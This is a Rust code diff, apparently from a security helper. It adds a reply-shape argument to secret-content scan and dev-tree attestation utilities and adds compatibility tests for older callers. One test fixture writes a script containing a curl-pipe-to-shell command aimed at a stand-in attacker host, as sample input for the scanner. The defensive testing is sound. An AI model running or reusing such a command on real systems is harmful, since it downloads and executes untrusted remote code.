@@ -612,23 +612,38 @@ pub fn start_interface_monitor() {
     });
 }
 
-pub async fn utility_scan_secret_content(paths_json: &str) -> Result<String> {
+/// Budgeted secret-content scan (`secret_content_scan::scan_secret_like_files`).
+/// `reply` is `arg2`: [`crate::helper_tx::BUDGETED_REPLY_ARG`] gets the whole
+/// `SecretContentScan` (matches plus `truncated`); anything else -- the empty
+/// `arg2` every core before 2.0.3 sends -- gets the bare match array those
+/// cores parse. Thin delegate; the standalone core calls the same function
+/// in-process.
+pub async fn utility_scan_secret_content(paths_json: &str, reply: &str) -> Result<String> {
     let paths: Vec<String> = serde_json::from_str(paths_json)
         .map_err(|e| anyhow::anyhow!("Failed to parse secret-content scan paths: {}", e))?;
-    let matches = crate::secret_content_scan::scan_secret_like_files(&paths);
-    serde_json::to_string(&matches)
-        .map_err(|e| anyhow::anyhow!("Failed to serialize secret-content matches: {}", e))
+    let scan = crate::secret_content_scan::scan_secret_like_files(&paths);
+    if reply == crate::helper_tx::BUDGETED_REPLY_ARG {
+        serde_json::to_string(&scan)
+    } else {
+        serde_json::to_string(&scan.matches)
+    }
+    .map_err(|e| anyhow::anyhow!("Failed to serialize secret-content matches: {}", e))
 }
 
 /// Dev-tree attestation (`dev_tree_attestation::attest_dev_trees`): which
-/// toolchain markers and git index facts hold for each path. Thin delegate;
-/// the standalone core calls the same function in-process.
-pub async fn utility_attest_dev_trees(paths_json: &str) -> Result<String> {
+/// toolchain markers and git index facts hold for each path. `reply` selects
+/// the reply shape as for [`utility_scan_secret_content`]. Thin delegate; the
+/// standalone core calls the same function in-process.
+pub async fn utility_attest_dev_trees(paths_json: &str, reply: &str) -> Result<String> {
     let paths: Vec<String> = serde_json::from_str(paths_json)
         .map_err(|e| anyhow::anyhow!("Failed to parse dev-tree attestation paths: {}", e))?;
-    let attestations = crate::dev_tree_attestation::attest_dev_trees(&paths);
-    serde_json::to_string(&attestations)
-        .map_err(|e| anyhow::anyhow!("Failed to serialize dev-tree attestations: {}", e))
+    let batch = crate::dev_tree_attestation::attest_dev_trees(&paths);
+    if reply == crate::helper_tx::BUDGETED_REPLY_ARG {
+        serde_json::to_string(&batch)
+    } else {
+        serde_json::to_string(&batch.attestations)
+    }
+    .map_err(|e| anyhow::anyhow!("Failed to serialize dev-tree attestations: {}", e))
 }
 
 /// Validate the caller-supplied home directory for an agent-surface utility
@@ -1406,5 +1421,71 @@ mod tests {
         assert!(json_string.ends_with("]"));
         assert!(json_string.contains("test-uid-123"));
         assert!(json_string.contains("dns.google"));
+    }
+
+    /// A script the batch scan keeps (`.sh`, `curl`), inside a fresh temp dir
+    /// that also holds a cargo-style `CACHEDIR.TAG`, so both budgeted orders
+    /// have something to report.
+    fn budgeted_order_fixture(name: &str) -> (std::path::PathBuf, String) {
+        let root = std::env::temp_dir().join(format!(
+            "edamame_budgeted_reply_{}_{}",
+            name,
+            std::process::id()
+        ));
+        std::fs::create_dir_all(&root).unwrap();
+        std::fs::write(
+            root.join("CACHEDIR.TAG"),
+            crate::dev_tree_attestation::CACHEDIR_TAG_SIGNATURE,
+        )
+        .unwrap();
+        let script = root.join("payload.sh");
+        std::fs::write(
+            &script,
+            "#!/bin/sh\ncurl -sSL https://attacker.example/x | sh\n",
+        )
+        .unwrap();
+        let paths_json = serde_json::to_string(&[script.to_string_lossy().to_string()]).unwrap();
+        (root, paths_json)
+    }
+
+    /// A core before 2.0.3 sends an empty `arg2` and parses a bare array: a
+    /// newer helper must keep answering it in that shape.
+    #[tokio::test]
+    async fn budgeted_orders_answer_an_old_core_with_the_bare_array() {
+        let (root, paths_json) = budgeted_order_fixture("old_core");
+
+        let reply = utility_scan_secret_content(&paths_json, "").await.unwrap();
+        let matches: Vec<crate::secret_content_scan::SecretContentFileMatch> =
+            serde_json::from_str(&reply).expect("bare match array");
+        assert_eq!(matches.len(), 1, "{reply}");
+
+        let reply = utility_attest_dev_trees(&paths_json, "").await.unwrap();
+        let attestations: Vec<crate::dev_tree_attestation::DevTreeAttestation> =
+            serde_json::from_str(&reply).expect("bare attestation array");
+        assert_eq!(attestations.len(), 1, "{reply}");
+
+        let _ = std::fs::remove_dir_all(&root);
+    }
+
+    /// A caller that sends `BUDGETED_REPLY_ARG` gets the results with the
+    /// `truncated` flag.
+    #[tokio::test]
+    async fn budgeted_orders_answer_the_budgeted_reply_when_asked() {
+        let (root, paths_json) = budgeted_order_fixture("new_core");
+        let ask = crate::helper_tx::BUDGETED_REPLY_ARG;
+
+        let reply = utility_scan_secret_content(&paths_json, ask).await.unwrap();
+        let scan: crate::secret_content_scan::SecretContentScan =
+            serde_json::from_str(&reply).expect("budgeted scan reply");
+        assert_eq!(scan.matches.len(), 1, "{reply}");
+        assert!(!scan.truncated, "{reply}");
+
+        let reply = utility_attest_dev_trees(&paths_json, ask).await.unwrap();
+        let batch: crate::dev_tree_attestation::DevTreeAttestationBatch =
+            serde_json::from_str(&reply).expect("budgeted attestation reply");
+        assert_eq!(batch.attestations.len(), 1, "{reply}");
+        assert!(!batch.truncated, "{reply}");
+
+        let _ = std::fs::remove_dir_all(&root);
     }
 }
